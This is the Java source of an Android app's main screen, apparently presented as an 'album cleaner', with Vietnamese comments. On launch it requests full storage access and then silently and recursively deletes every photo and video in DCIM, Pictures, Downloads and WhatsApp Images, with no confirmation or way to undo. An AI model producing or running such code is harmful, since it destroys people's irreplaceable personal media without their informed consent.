package com.cleaner.album;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE = 100;
    private String[] permissions;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ cần MANAGE_EXTERNAL_STORAGE
            if (!Environment.isExternalStorageManager()) {
                android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            } else {
                deleteAllImages();
            }
        } else {
            permissions = new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
            checkPermissions();
        }
    }

    private void checkPermissions() {
        List<String> listPerm = new ArrayList<>();
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listPerm.add(perm);
            }
        }
        if (!listPerm.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPerm.toArray(new String[0]), REQUEST_CODE);
        } else {
            deleteAllImages();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE) {
            boolean granted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }
            if (granted) {
                deleteAllImages();
            } else {
                Toast.makeText(this, "Cần cấp quyền để dọn ảnh", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    private void deleteAllImages() {
        // Các thư mục ảnh phổ biến
        String[] dirs = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images",
                Environment.getExternalStorageDirectory() + "/Pictures",
                Environment.getExternalStorageDirectory() + "/DCIM"
        };

        for (String dirPath : dirs) {
            File folder = new File(dirPath);
            if (folder.exists() && folder.isDirectory()) {
                deleteImagesRecursive(folder);
            }
        }

        Toast.makeText(this, "Đã xóa toàn bộ ảnh và video trong album!", Toast.LENGTH_LONG).show();
        finish();
    }

    private void deleteImagesRecursive(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) {
                    deleteImagesRecursive(f);
                } else {
                    String name = f.getName().toLowerCase();
                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
                            name.endsWith(".gif") || name.endsWith(".mp4") || name.endsWith(".3gp") ||
                            name.endsWith(".webp") || name.endsWith(".bmp")) {
                        f.delete();
                    }
                }
            }
        }
    }
}
